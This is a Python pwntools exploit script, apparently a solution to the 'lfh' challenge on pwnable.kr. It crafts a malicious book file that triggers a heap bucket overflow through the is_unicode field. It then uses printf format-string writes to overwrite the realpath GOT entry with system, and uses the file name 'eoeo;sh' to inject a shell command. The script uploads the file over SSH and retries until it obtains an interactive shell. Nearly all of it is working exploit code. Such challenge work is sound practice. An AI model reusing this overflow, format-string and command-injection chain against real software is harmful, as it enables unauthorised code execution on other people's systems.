from pwn import *
elf = context.binary = ELF("./lfh")
libc = ELF("libc.so.6")

class Book:
    TITLE_LEN = 32
    ABSTRACT_LEN = 256
    MAX_CONTENT_LEN = 0x1000

    def __init__(self, title, abstract, content_len, content, is_unicode):
        assert len(title) < self.TITLE_LEN
        assert len(abstract) < self.ABSTRACT_LEN
        assert len(content) <= self.MAX_CONTENT_LEN

        if is_unicode:
            assert len(content) % 2 == 0

        self.title = title
        self.abstract = abstract
        self.content = content
        self.content_length = content_len
        self.is_unicode = is_unicode

    def build(self, io):
       io.write(
        self.title.ljust(self.TITLE_LEN, b"\x00") +
        self.abstract.ljust(self.ABSTRACT_LEN, b"\x00") +
        p64(0) + p32(self.content_length) + 
        p32(self.is_unicode) + p64(0) * 2 + self.content
       )

class BookFile:
    SIGNATURE = b"BOOK"

    def __init__(self, books):
        self.books = books

    def build(self, io):
        io.write(self.SIGNATURE)

        for book in self.books:
            book.build(io)

BUCKET_SIZE = 0x4000
SIZEOF_BOOK = 0x140
CHUNK_CLASS = SIZEOF_BOOK + 0x10
N_TOTAL_CHUNK = BUCKET_SIZE // CHUNK_CLASS

def call(addr, arg):
    books = [ Book(title=b"", abstract=b"", content_len=1, content=b"\x00", is_unicode=False) for _ in range(N_TOTAL_CHUNK - 2) ]

    # last two chunks: one normal book, one overflow
    # allocate one book
    payload = b""
    payload += b"." * CHUNK_CLASS
    payload += arg
    payload += b"." * (Book.TITLE_LEN + Book.ABSTRACT_LEN - len(arg))
    payload += p64(addr)
    payload = payload.ljust(2 * SIZEOF_BOOK, b"\x00") 
    books.append(
            Book(
                 title=b"pwned!",
                 abstract=b"",
                 content_len=SIZEOF_BOOK,
                 content=payload, 
                 is_unicode=True, # Trigger overflow and overwrite book fptr with `printf(format_string)`
                )
            )
    return books

# Vulnerability: When is_unicode field is set, it causes an overflow in the current Bucket memory
# Strategy: Replace realpath with system (using 2 bytes partial ovewrite of the GOT entry via printf's FSB)
# Must: SECURE_HEAP must be enabled 

FILENAME="eoeo;sh"
PRINTF = elf.sym['printf']
SYSTEM = libc.sym['system']
REALPATH_GOT = elf.got['realpath']

# offset 6 points to ENV in the stack (specifically argv[0])
# offset 71 is the stack address holding argv[0]
# writes are done en reverse, because linked list is traversed in reverse
books = []
books += call(PRINTF, b"."*((SYSTEM >> 8) & 0xFF) + "%71$hhn\n\x00".encode())
books += call(PRINTF, f"%0{REALPATH_GOT+1}x%6$lln\n\x00".encode())
books += call(PRINTF, b"."*(SYSTEM & 0xFF) + "%71$hhn\n\x00".encode())
books += call(PRINTF, f"%0{REALPATH_GOT}x%6$lln\n\x00".encode())
book_file = BookFile(books)
with open(FILENAME, "wb") as f:
    book_file.build(f)

shell = ssh("lfh","pwnable.kr",2222,"guest")
shell.set_working_directory()
shell.upload_file(FILENAME)

# try a couple of times
for _ in range(20):
    r = shell.connect_remote("0.0.0.0", 9040)
    r.sendlineafter(b"your book file path please :", f"{shell.cwd}/{FILENAME}".encode())
    r.sendlineafter(b"your mode please :", b"1")
    r.sendlineafter(b"continue?(y/n)", b"y")
    r.recvuntil(b"terminating the program")
    try:
        r.recvuntil(b"eoeo: not found")
    except:
        log.failure("Failure (crash)")
        r.close()
        continue
    log.success("Success!")
    r.interactive()
    break